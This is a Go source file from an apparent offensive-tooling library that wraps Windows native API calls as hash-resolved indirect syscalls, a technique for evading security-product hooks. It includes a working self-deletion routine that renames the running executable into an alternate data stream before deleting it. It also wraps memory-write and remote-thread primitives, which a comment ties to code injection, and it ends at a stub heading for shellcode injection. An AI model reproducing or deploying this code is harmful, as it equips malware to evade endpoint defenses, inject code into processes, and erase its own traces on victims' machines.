// Package winapi provides indirect Windows API syscalls using assembly and PE parsing
// This module implements indirect syscalls that jump to syscall instructions in ntdll
package winapi

import (
	"fmt"
	"time"
	"unsafe"
	"os"
	"github.com/carved4/go-native-syscall/pkg/debug"
	"github.com/carved4/go-native-syscall/pkg/obf"
	"github.com/carved4/go-native-syscall/pkg/syscall"
	"unicode/utf16"
)

// IndirectSyscall executes an indirect syscall by function name
// This jumps to the syscall instruction in ntdll instead of executing syscall directly
func IndirectSyscall(functionName string, args ...uintptr) (uintptr, error) {
	functionHash := obf.GetHash(functionName)
	return syscall.HashIndirectSyscall(functionHash, args...)
}

// IndirectSyscallByHash executes an indirect syscall by function name hash
// Useful for obfuscation when you want to pre-compute hashes
func IndirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error) {
	return syscall.HashIndirectSyscall(functionHash, args...)
}

func SelfDelIndirect() {
	exePath, err := os.Executable()
	if err != nil {
		panic(err)
	}
	
	// Use NT path format which is required for NtCreateFile with DELETE access
	ntPath := "\\??\\" + exePath
	debug.Printfln("SELFDEL INDIRECT", "Using NT path format: %s\n", ntPath)
	
	if tryDeleteWithPathIndirect(ntPath) {
		debug.Printfln("SELFDEL INDIRECT", "Successfully initiated self-deletion\n")
		return
	}
	
	debug.Printfln("SELFDEL INDIRECT", "[!] Self-deletion failed\n")
}


func tryDeleteWithPathIndirect(pathToTry string) bool {
	// Convert to UTF-16 for NtCreateFile
	utfPath := StringToUTF16(pathToTry)

	// Create UNICODE_STRING manually and correctly
	// Count the actual UTF-16 length (excluding null terminator)
	pathLen := uint16(0)
	ptr := utfPath
	for *ptr != 0 {
		pathLen += 2 // Each UTF-16 character is 2 bytes
		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
	}

	objectName := UNICODE_STRING{
		Length:        pathLen,           // Length in bytes (excluding null terminator)
		MaximumLength: pathLen + 2,       // Include null terminator
		Buffer:        utfPath,
	}

	debug.Printfln("SELFDEL INDIRECT", "UNICODE_STRING: Length=%d, MaxLength=%d\n", objectName.Length, objectName.MaximumLength)

	// Initialize OBJECT_ATTRIBUTES
	objAttr := OBJECT_ATTRIBUTES{
		Length:                   uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		RootDirectory:            0,
		ObjectName:               &objectName,
		Attributes:               OBJ_CASE_INSENSITIVE,
		SecurityDescriptor:       0,
		SecurityQualityOfService: 0,
	}

	debug.Printfln("SELFDEL INDIRECT", "OBJECT_ATTRIBUTES initialized, Length=%d\n", objAttr.Length)

	// Open the file handle via NtCreateFile
	var handle uintptr
	var ioStatus IO_STATUS_BLOCK

	// Debug: Check handle value before the call
	debug.Printfln("SELFDEL INDIRECT", "Handle before NtCreateFileIndirect: 0x%X\n", handle)
	debug.Printfln("SELFDEL INDIRECT", "Handle address: %p\n", &handle)

	status, err := NtCreateFileIndirect(
		&handle,
		DELETE|SYNCHRONIZE,
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&ioStatus)),
		nil, // AllocationSize
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT,
		nil, // EaBuffer
		0,   // EaLength
	)
	
	// Debug: Check handle value after the call
	debug.Printfln("SELFDEL INDIRECT", "Handle after NtCreateFileIndirect: 0x%X\n", handle)
	debug.Printfln("SELFDEL INDIRECT", "Status: 0x%X, Error: %v\n", status, err)

	if err != nil || status != STATUS_SUCCESS {
		debug.Printfln("SELFDEL INDIRECT", "NtCreateFile failed: %v (%s)\n", err, FormatNTStatus(status))
		return false
	}
	defer NtCloseIndirect(handle)
	debug.Printfln("SELFDEL INDIRECT", "File handle acquired with DELETE access\n")

	// Prepare FILE_RENAME_INFORMATION with alternate data stream name
	streamName := ":trash"
	streamUTF16 := StringToUTF16(streamName)
	
	// Calculate the actual UTF-16 byte length (excluding null terminator)
	streamNameBytes := 0
	ptr = streamUTF16
	for *ptr != 0 {
		streamNameBytes += 2
		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
	}
	
	// Create the rename information structure
	renameSize := uintptr(unsafe.Sizeof(FILE_RENAME_INFO{})) + uintptr(streamNameBytes)
	buf := make([]byte, renameSize)
	renameInfo := (*FILE_RENAME_INFO)(unsafe.Pointer(&buf[0]))
	renameInfo.ReplaceIfExists = 1  // Allow replacement
	renameInfo.RootDirectory = 0    // No root directory
	renameInfo.FileNameLength = uint32(streamNameBytes)
	
	// Copy the UTF-16 string to the FileName field (without null terminator)
	dstPtr := uintptr(unsafe.Pointer(&renameInfo.FileName[0]))
	srcPtr := uintptr(unsafe.Pointer(streamUTF16))
	for i := 0; i < streamNameBytes/2; i++ {
		*(*uint16)(unsafe.Pointer(dstPtr + uintptr(i*2))) = *(*uint16)(unsafe.Pointer(srcPtr + uintptr(i*2)))
	}

	// Debug: Validate handle before NtSetInformationFile call
	debug.Printfln("SELFDEL INDIRECT", "About to call NtSetInformationFileIndirect with handle=0x%X, renameSize=%d\n", handle, renameSize)
	debug.Printfln("SELFDEL INDIRECT", "FILE_RENAME_INFO: ReplaceIfExists=%d, RootDirectory=0x%X, FileNameLength=%d\n", 
		renameInfo.ReplaceIfExists, renameInfo.RootDirectory, renameInfo.FileNameLength)

	// Call NtSetInformationFile to rename to ADS
	status, err = NtSetInformationFileIndirect(
		handle,
		uintptr(unsafe.Pointer(&ioStatus)),
		unsafe.Pointer(renameInfo),
		uintptr(renameSize),
		FileRenameInformation,
	)
	if err != nil || status != STATUS_SUCCESS {
		debug.Printfln("SELFDEL INDIRECT", "Rename failed: %v (%s)\n", err, FormatNTStatus(status))
		return false
	}
	debug.Printfln("SELFDEL INDIRECT", "File renamed to ADS\n")

	// Set FILE_DISPOSITION_INFO to mark for deletion
	dispose := FILE_DISPOSITION_INFO{DeleteFile: 1}
	status, err = NtSetInformationFileIndirect(
		handle,
		uintptr(unsafe.Pointer(&ioStatus)),
		unsafe.Pointer(&dispose),
		uintptr(unsafe.Sizeof(dispose)),
		FileDispositionInformation,
	)
	if err != nil || status != STATUS_SUCCESS {
		debug.Printfln("SELFDEL INDIRECT", "Disposition failed: %v (%s)\n", err, FormatNTStatus(status))
		return false
	}
	debug.Printfln("SELFDEL INDIRECT", "File marked for deletion\n")
	return true
}

// Common Windows API functions with proper type safety

// NtAllocateVirtualMemory allocates memory in a process
func NtAllocateVirtualMemoryIndirect(processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, regionSize *uintptr, allocationType, protect uintptr) (uintptr, error) {
	return IndirectSyscall("NtAllocateVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		allocationType,
		protect)
}

// NtWriteVirtualMemory writes to memory in a process
func NtWriteVirtualMemoryIndirect(processHandle uintptr, baseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesWritten *uintptr) (uintptr, error) {
	debug.Printfln("WINAPI", "NtWriteVirtualMemory called\n")
	
	// Make the syscall (simple and direct like other functions)
	result, err := IndirectSyscall("NtWriteVirtualMemory",
		processHandle,
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesWritten)))
	
	// Only log bytes written if pointer is valid
	if bytesWritten != nil {
		debug.Printfln("WINAPI", "Result status: 0x%X, Bytes written: %d\n", result, *bytesWritten)
	} else {
		debug.Printfln("WINAPI", "Result status: 0x%X\n", result)
	}
	
	return result, err
}

// NtReadVirtualMemory reads from memory in a process
func NtReadVirtualMemoryIndirect(processHandle uintptr, baseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesRead *uintptr) (uintptr, error) {
	return IndirectSyscall("NtReadVirtualMemory",
		processHandle,
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesRead)))
}

// NtProtectVirtualMemory changes memory protection
func NtProtectVirtualMemoryIndirect(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uintptr) (uintptr, error) {
	return IndirectSyscall("NtProtectVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		newProtect,
		uintptr(unsafe.Pointer(oldProtect)))
}

// NtCreateThreadEx creates a thread in a process
func NtCreateThreadExIndirect(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, processHandle uintptr, startAddress uintptr, arg uintptr, createFlags uintptr, zeroBits uintptr, stackSize uintptr, maximumStackSize uintptr, attributeList uintptr) (uintptr, error) {
	return IndirectSyscall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		processHandle,
		startAddress,
		arg,
		createFlags,
		zeroBits,
		stackSize,
		maximumStackSize,
		attributeList)
}

// NtOpenProcess opens a handle to a process
func NtOpenProcessIndirect(processHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, clientId uintptr) (uintptr, error) {
	return IndirectSyscall("NtOpenProcess",
		uintptr(unsafe.Pointer(processHandle)),
		desiredAccess,
		objectAttributes,
		clientId)
}

// NtClose closes a handle
func NtCloseIndirect(handle uintptr) (uintptr, error) {
	return IndirectSyscall("NtClose", handle)
}

// NtQuerySystemInformation queries system information
func NtQuerySystemInformationIndirect(systemInformationClass uintptr, systemInformation unsafe.Pointer, systemInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return IndirectSyscall("NtQuerySystemInformation",
		systemInformationClass,
		uintptr(systemInformation),
		systemInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtQueryInformationProcess queries process information
func NtQueryInformationProcessIndirect(processHandle uintptr, processInformationClass uintptr, processInformation unsafe.Pointer, processInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return IndirectSyscall("NtQueryInformationProcess",
		processHandle,
		processInformationClass,
		uintptr(processInformation),
		processInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtSetInformationProcess sets process information
func NtSetInformationProcessIndirect(processHandle uintptr, processInformationClass uintptr, processInformation unsafe.Pointer, processInformationLength uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetInformationProcess",
		processHandle,
		processInformationClass,
		uintptr(processInformation),
		processInformationLength)
}

// NtCreateFile creates or opens a file
func NtCreateFileIndirect(fileHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, ioStatusBlock uintptr, allocationSize *uint64, fileAttributes uintptr, shareAccess uintptr, createDisposition uintptr, createOptions uintptr, eaBuffer unsafe.Pointer, eaLength uintptr) (uintptr, error) {
	return IndirectSyscall("NtCreateFile",
		uintptr(unsafe.Pointer(fileHandle)),
		desiredAccess,
		objectAttributes,
		ioStatusBlock,
		uintptr(unsafe.Pointer(allocationSize)),
		fileAttributes,
		shareAccess,
		createDisposition,
		createOptions,
		uintptr(eaBuffer),
		eaLength)
}

// NtWriteFile writes to a file
func NtWriteFileIndirect(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, buffer unsafe.Pointer, length uintptr, byteOffset *uint64, key *uintptr) (uintptr, error) {
	return IndirectSyscall("NtWriteFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		uintptr(buffer),
		length,
		uintptr(unsafe.Pointer(byteOffset)),
		uintptr(unsafe.Pointer(key)))
}

// NtReadFile reads from a file
func NtReadFileIndirect(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, buffer unsafe.Pointer, length uintptr, byteOffset *uint64, key *uintptr) (uintptr, error) {
	return IndirectSyscall("NtReadFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		uintptr(buffer),
		length,
		uintptr(unsafe.Pointer(byteOffset)),
		uintptr(unsafe.Pointer(key)))
}

// Additional Process Manipulation Functions

// NtTerminateProcess terminates a process
func NtTerminateProcessIndirect(processHandle uintptr, exitStatus uintptr) (uintptr, error) {
	return IndirectSyscall("NtTerminateProcess",
		processHandle,
		exitStatus)
}

// NtSuspendProcess suspends all threads in a process
func NtSuspendProcessIndirect(processHandle uintptr) (uintptr, error) {
	return IndirectSyscall("NtSuspendProcess", processHandle)
}

// NtResumeProcess resumes all threads in a process
func NtResumeProcessIndirect(processHandle uintptr) (uintptr, error) {
	return IndirectSyscall("NtResumeProcess", processHandle)
}

// NtCreateProcess creates a new process
func NtCreateProcessIndirect(processHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, parentProcess uintptr, inheritObjectTable bool, sectionHandle uintptr, debugPort uintptr, exceptionPort uintptr) (uintptr, error) {
	inherit := uintptr(0)
	if inheritObjectTable {
		inherit = 1
	}
	return IndirectSyscall("NtCreateProcess",
		uintptr(unsafe.Pointer(processHandle)),
		desiredAccess,
		objectAttributes,
		parentProcess,
		inherit,
		sectionHandle,
		debugPort,
		exceptionPort)
}

// Thread Management Functions

// NtCreateThread creates a thread in a process
func NtCreateThreadIndirect(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, processHandle uintptr, startAddress uintptr, arg uintptr, createSuspended bool, zeroBits uintptr, stackSize uintptr, maximumStackSize uintptr, initialTeb uintptr) (uintptr, error) {
	flags := uintptr(0)
	if createSuspended {
		flags = 1
	}
	return IndirectSyscall("NtCreateThread",
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		processHandle,
		startAddress,
		arg,
		flags,
		zeroBits,
		stackSize,
		maximumStackSize,
		initialTeb)
}

// NtOpenThread opens a handle to a thread
func NtOpenThreadIndirect(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, clientId uintptr) (uintptr, error) {
	return IndirectSyscall("NtOpenThread",
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		clientId)
}

// NtSuspendThread suspends a thread
func NtSuspendThreadIndirect(threadHandle uintptr, previousSuspendCount *uintptr) (uintptr, error) {
	return IndirectSyscall("NtSuspendThread",
		threadHandle,
		uintptr(unsafe.Pointer(previousSuspendCount)))
}

// NtResumeThread resumes a thread
func NtResumeThreadIndirect(threadHandle uintptr, previousSuspendCount *uintptr) (uintptr, error) {
	return IndirectSyscall("NtResumeThread",
		threadHandle,
		uintptr(unsafe.Pointer(previousSuspendCount)))
}

// NtTerminateThread terminates a thread
func NtTerminateThreadIndirect(threadHandle uintptr, exitStatus uintptr) (uintptr, error) {
	return IndirectSyscall("NtTerminateThread",
		threadHandle,
		exitStatus)
}

// Memory and Section Functions

// NtCreateSection creates a section object
func NtCreateSectionIndirect(sectionHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, maximumSize *uint64, sectionPageProtection uintptr, allocationAttributes uintptr, fileHandle uintptr) (uintptr, error) {
	return IndirectSyscall("NtCreateSection",
		uintptr(unsafe.Pointer(sectionHandle)),
		desiredAccess,
		objectAttributes,
		uintptr(unsafe.Pointer(maximumSize)),
		sectionPageProtection,
		allocationAttributes,
		fileHandle)
}

// NtMapViewOfSection maps a view of a section
func NtMapViewOfSectionIndirect(sectionHandle uintptr, processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, commitSize uintptr, sectionOffset *uint64, viewSize *uintptr, inheritDisposition uintptr, allocationType uintptr, win32Protect uintptr) (uintptr, error) {
	return IndirectSyscall("NtMapViewOfSection",
		sectionHandle,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		commitSize,
		uintptr(unsafe.Pointer(sectionOffset)),
		uintptr(unsafe.Pointer(viewSize)),
		inheritDisposition,
		allocationType,
		win32Protect)
}

// NtUnmapViewOfSection unmaps a view of a section
func NtUnmapViewOfSectionIndirect(processHandle uintptr, baseAddress uintptr) (uintptr, error) {
	return IndirectSyscall("NtUnmapViewOfSection",
		processHandle,
		baseAddress)
}

// NtFreeVirtualMemory frees virtual memory
func NtFreeVirtualMemoryIndirect(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uintptr) (uintptr, error) {
	return IndirectSyscall("NtFreeVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		freeType)
}

// NtQueryVirtualMemory queries virtual memory information
func NtQueryVirtualMemoryIndirect(processHandle uintptr, baseAddress uintptr, memoryInformationClass uintptr, memoryInformation unsafe.Pointer, memoryInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return IndirectSyscall("NtQueryVirtualMemory",
		processHandle,
		baseAddress,
		memoryInformationClass,
		uintptr(memoryInformation),
		memoryInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// Registry Functions

// NtCreateKey creates or opens a registry key
func NtCreateKeyIndirect(keyHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, titleIndex uintptr, class uintptr, createOptions uintptr, disposition *uintptr) (uintptr, error) {
	return IndirectSyscall("NtCreateKey",
		uintptr(unsafe.Pointer(keyHandle)),
		desiredAccess,
		objectAttributes,
		titleIndex,
		class,
		createOptions,
		uintptr(unsafe.Pointer(disposition)))
}

// NtOpenKey opens a registry key
func NtOpenKeyIndirect(keyHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr) (uintptr, error) {
	return IndirectSyscall("NtOpenKey",
		uintptr(unsafe.Pointer(keyHandle)),
		desiredAccess,
		objectAttributes)
}

// NtDeleteKey deletes a registry key
func NtDeleteKeyIndirect(keyHandle uintptr) (uintptr, error) {
	return IndirectSyscall("NtDeleteKey", keyHandle)
}

// NtSetValueKey sets a registry value
func NtSetValueKeyIndirect(keyHandle uintptr, valueName uintptr, titleIndex uintptr, dataType uintptr, data unsafe.Pointer, dataSize uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetValueKey",
		keyHandle,
		valueName,
		titleIndex,
		dataType,
		uintptr(data),
		dataSize)
}

// NtQueryValueKey queries a registry value
func NtQueryValueKeyIndirect(keyHandle uintptr, valueName uintptr, keyValueInformationClass uintptr, keyValueInformation unsafe.Pointer, length uintptr, resultLength *uintptr) (uintptr, error) {
	return IndirectSyscall("NtQueryValueKey",
		keyHandle,
		valueName,
		keyValueInformationClass,
		uintptr(keyValueInformation),
		length,
		uintptr(unsafe.Pointer(resultLength)))
}

// NtDeleteValueKey deletes a registry value
func NtDeleteValueKeyIndirect(keyHandle uintptr, valueName uintptr) (uintptr, error) {
	return IndirectSyscall("NtDeleteValueKey",
		keyHandle,
		valueName)
}

// Security and Token Functions

// NtOpenProcessToken opens a process token
func NtOpenProcessTokenIndirect(processHandle uintptr, desiredAccess uintptr, tokenHandle *uintptr) (uintptr, error) {
	return IndirectSyscall("NtOpenProcessToken",
		processHandle,
		desiredAccess,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// NtOpenThreadToken opens a thread token
func NtOpenThreadTokenIndirect(threadHandle uintptr, desiredAccess uintptr, openAsSelf bool, tokenHandle *uintptr) (uintptr, error) {
	openSelf := uintptr(0)
	if openAsSelf {
		openSelf = 1
	}
	return IndirectSyscall("NtOpenThreadToken",
		threadHandle,
		desiredAccess,
		openSelf,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// NtQueryInformationToken queries token information
func NtQueryInformationTokenIndirect(tokenHandle uintptr, tokenInformationClass uintptr, tokenInformation unsafe.Pointer, tokenInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return IndirectSyscall("NtQueryInformationToken",
		tokenHandle,
		tokenInformationClass,
		uintptr(tokenInformation),
		tokenInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtSetInformationToken sets token information
func NtSetInformationTokenIndirect(tokenHandle uintptr, tokenInformationClass uintptr, tokenInformation unsafe.Pointer, tokenInformationLength uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetInformationToken",
		tokenHandle,
		tokenInformationClass,
		uintptr(tokenInformation),
		tokenInformationLength)
}

// NtAdjustPrivilegesToken adjusts token privileges
func NtAdjustPrivilegesTokenIndirect(tokenHandle uintptr, disableAllPrivileges bool, newState unsafe.Pointer, bufferLength uintptr, previousState unsafe.Pointer, returnLength *uintptr) (uintptr, error) {
	disable := uintptr(0)
	if disableAllPrivileges {
		disable = 1
	}
	return IndirectSyscall("NtAdjustPrivilegesToken",
		tokenHandle,
		disable,
		uintptr(newState),
		bufferLength,
		uintptr(previousState),
		uintptr(unsafe.Pointer(returnLength)))
}

// Object and Handle Functions

// NtDuplicateObject duplicates an object handle
func NtDuplicateObjectIndirect(sourceProcessHandle uintptr, sourceHandle uintptr, targetProcessHandle uintptr, targetHandle *uintptr, desiredAccess uintptr, inheritHandle bool, options uintptr) (uintptr, error) {
	inherit := uintptr(0)
	if inheritHandle {
		inherit = 1
	}
	return IndirectSyscall("NtDuplicateObject",
		sourceProcessHandle,
		sourceHandle,
		targetProcessHandle,
		uintptr(unsafe.Pointer(targetHandle)),
		desiredAccess,
		inherit,
		options)
}

// NtQueryObject queries information about an object
func NtQueryObjectIndirect(handle uintptr, objectInformationClass uintptr, objectInformation unsafe.Pointer, objectInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return IndirectSyscall("NtQueryObject",
		handle,
		objectInformationClass,
		uintptr(objectInformation),
		objectInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// System Information and Control Functions

// NtSetSystemInformation sets system information
func NtSetSystemInformationIndirect(systemInformationClass uintptr, systemInformation unsafe.Pointer, systemInformationLength uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetSystemInformation",
		systemInformationClass,
		uintptr(systemInformation),
		systemInformationLength)
}

// NtQuerySystemTime queries system time
func NtQuerySystemTimeIndirect(systemTime *uint64) (uintptr, error) {
	return IndirectSyscall("NtQuerySystemTime",
		uintptr(unsafe.Pointer(systemTime)))
}

// NtSetSystemTime sets system time
func NtSetSystemTimeIndirect(systemTime *uint64, previousTime *uint64) (uintptr, error) {
	return IndirectSyscall("NtSetSystemTime",
		uintptr(unsafe.Pointer(systemTime)),
		uintptr(unsafe.Pointer(previousTime)))
}

// Event and Synchronization Functions

// NtCreateEvent creates an event object
func NtCreateEventIndirect(eventHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, eventType uintptr, initialState bool) (uintptr, error) {
	state := uintptr(0)
	if initialState {
		state = 1
	}
	return IndirectSyscall("NtCreateEvent",
		uintptr(unsafe.Pointer(eventHandle)),
		desiredAccess,
		objectAttributes,
		eventType,
		state)
}

// NtOpenEvent opens an event object
func NtOpenEventIndirect(eventHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr) (uintptr, error) {
	return IndirectSyscall("NtOpenEvent",
		uintptr(unsafe.Pointer(eventHandle)),
		desiredAccess,
		objectAttributes)
}

// NtSetEvent sets an event to signaled state
func NtSetEventIndirect(eventHandle uintptr, previousState *uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetEvent",
		eventHandle,
		uintptr(unsafe.Pointer(previousState)))
}

// NtResetEvent resets an event to non-signaled state
func NtResetEventIndirect(eventHandle uintptr, previousState *uintptr) (uintptr, error) {
	return IndirectSyscall("NtResetEvent",
		eventHandle,
		uintptr(unsafe.Pointer(previousState)))
}

// NtWaitForSingleObject waits for a single object
func NtWaitForSingleObjectIndirect(handle uintptr, alertable bool, timeout *uint64) (uintptr, error) {
	alert := uintptr(0)
	if alertable {
		alert = 1
	}
	return IndirectSyscall("NtWaitForSingleObject",
		handle,
		alert,
		uintptr(unsafe.Pointer(timeout)))
}

// NtWaitForMultipleObjects waits for multiple objects
func NtWaitForMultipleObjectsIndirect(count uintptr, handles *uintptr, waitType uintptr, alertable bool, timeout *uint64) (uintptr, error) {
	alert := uintptr(0)
	if alertable {
		alert = 1
	}
	return IndirectSyscall("NtWaitForMultipleObjects",
		count,
		uintptr(unsafe.Pointer(handles)),
		waitType,
		alert,
		uintptr(unsafe.Pointer(timeout)))
}

// File System Functions

// NtDeleteFile deletes a file
func NtDeleteFileIndirect(objectAttributes uintptr) (uintptr, error) {
	return IndirectSyscall("NtDeleteFile", objectAttributes)
}

// NtQueryDirectoryFile queries directory contents
func NtQueryDirectoryFileIndirect(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, fileInformation unsafe.Pointer, length uintptr, fileInformationClass uintptr, returnSingleEntry bool, fileName uintptr, restartScan bool) (uintptr, error) {
	single := uintptr(0)
	if returnSingleEntry {
		single = 1
	}
	restart := uintptr(0)
	if restartScan {
		restart = 1
	}
	return IndirectSyscall("NtQueryDirectoryFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		uintptr(fileInformation),
		length,
		fileInformationClass,
		single,
		fileName,
		restart)
}

// NtQueryInformationFile queries file information
func NtQueryInformationFileIndirect(fileHandle uintptr, ioStatusBlock uintptr, fileInformation unsafe.Pointer, length uintptr, fileInformationClass uintptr) (uintptr, error) {
	return IndirectSyscall("NtQueryInformationFile",
		fileHandle,
		ioStatusBlock,
		uintptr(fileInformation),
		length,
		fileInformationClass)
}

// NtSetInformationFile sets file information
func NtSetInformationFileIndirect(fileHandle uintptr, ioStatusBlock uintptr, fileInformation unsafe.Pointer, length uintptr, fileInformationClass uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetInformationFile",
		fileHandle,
		ioStatusBlock,
		uintptr(fileInformation),
		length,
		fileInformationClass)
}

// NtDeviceIoControlFile performs an I/O control operation on a file
func NtDeviceIoControlFileIndirect(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, ioControlCode uintptr, inputBuffer unsafe.Pointer, inputBufferLength uintptr, outputBuffer unsafe.Pointer, outputBufferLength uintptr) (uintptr, error) {
	return IndirectSyscall("NtDeviceIoControlFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		ioControlCode,
		uintptr(inputBuffer),
		inputBufferLength,
		uintptr(outputBuffer),
		outputBufferLength)
}

// NtRemoveIoCompletion removes a completed I/O operation from an I/O completion port
func NtRemoveIoCompletionIndirect(portHandle uintptr, keyPtr *uintptr, apcContextPtr *uintptr, ioStatusBlock uintptr, timeout *uint64) (uintptr, error) {
	return IndirectSyscall("NtRemoveIoCompletion",
		portHandle,
		uintptr(unsafe.Pointer(keyPtr)),
		uintptr(unsafe.Pointer(apcContextPtr)),
		ioStatusBlock,
		uintptr(unsafe.Pointer(timeout)))
}

// NtReleaseSemaphore releases a semaphore object
func NtReleaseSemaphoreIndirect(semaphoreHandle uintptr, releaseCount uintptr, previousCount *uintptr) (uintptr, error) {
	return IndirectSyscall("NtReleaseSemaphore",
		semaphoreHandle,
		releaseCount,
		uintptr(unsafe.Pointer(previousCount)))
}

// NtReplyWaitReceivePort waits for and receives a message on a port, optionally sending a reply
func NtReplyWaitReceivePortIndirect(portHandle uintptr, portContext *uintptr, replyMessage uintptr, receiveMessage uintptr) (uintptr, error) {
	return IndirectSyscall("NtReplyWaitReceivePort",
		portHandle,
		uintptr(unsafe.Pointer(portContext)),
		replyMessage,
		receiveMessage)
}

// NtReplyPort sends a reply message to a port
func NtReplyPortIndirect(portHandle uintptr, replyMessage uintptr) (uintptr, error) {
	return IndirectSyscall("NtReplyPort",
		portHandle,
		replyMessage)
}

// NtSetInformationThread sets information about a thread
func NtSetInformationThreadIndirect(threadHandle uintptr, threadInformationClass uintptr, threadInformation unsafe.Pointer, threadInformationLength uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetInformationThread",
		threadHandle,
		threadInformationClass,
		uintptr(threadInformation),
		threadInformationLength)
}

// NtQueryInformationThread queries information about a thread
func NtQueryInformationThreadIndirect(threadHandle uintptr, threadInformationClass uintptr, threadInformation unsafe.Pointer, threadInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return IndirectSyscall("NtQueryInformationThread",
		threadHandle,
		threadInformationClass,
		uintptr(threadInformation),
		threadInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtFlushInstructionCache flushes the instruction cache for the specified process
// This is critical for code injection scenarios to ensure cache coherency
func NtFlushInstructionCacheIndirect(processHandle uintptr, baseAddress uintptr, size uintptr) (uintptr, error) {
	return IndirectSyscall("NtFlushInstructionCache",
		processHandle,
		baseAddress,
		size)
}

// NtSetEventBoostPriority temporarily boosts the priority of waiting threads
func NtSetEventBoostPriorityIndirect(eventHandle uintptr) (uintptr, error) {
	return IndirectSyscall("NtSetEventBoostPriority",
		eventHandle)
}

// NtQueryPerformanceCounter queries the performance counter
func NtQueryPerformanceCounterIndirect(performanceCounter *uint64, performanceFrequency *uint64) (uintptr, error) {
	return IndirectSyscall("NtQueryPerformanceCounter",
		uintptr(unsafe.Pointer(performanceCounter)),
		uintptr(unsafe.Pointer(performanceFrequency)))
}

// NtOpenThreadTokenEx opens the access token associated with a thread with extended parameters
func NtOpenThreadTokenExIndirect(threadHandle uintptr, desiredAccess uintptr, openAsSelf bool, handleAttributes uintptr, tokenHandle *uintptr) (uintptr, error) {
	openSelf := uintptr(0)
	if openAsSelf {
		openSelf = 1
	}
	return IndirectSyscall("NtOpenThreadTokenEx",
		threadHandle,
		desiredAccess,
		openSelf,
		handleAttributes,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// NtOpenProcessTokenEx opens the access token associated with a process with extended parameters
func NtOpenProcessTokenExIndirect(processHandle uintptr, desiredAccess uintptr, handleAttributes uintptr, tokenHandle *uintptr) (uintptr, error) {
	return IndirectSyscall("NtOpenProcessTokenEx",
		processHandle,
		desiredAccess,
		handleAttributes,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// NtInjectSelfShellcodeIndirect injects shellcode into the current process using indirect syscalls
// Implements the same "safe memory" pattern as the direct syscall version to handle Go GC issues
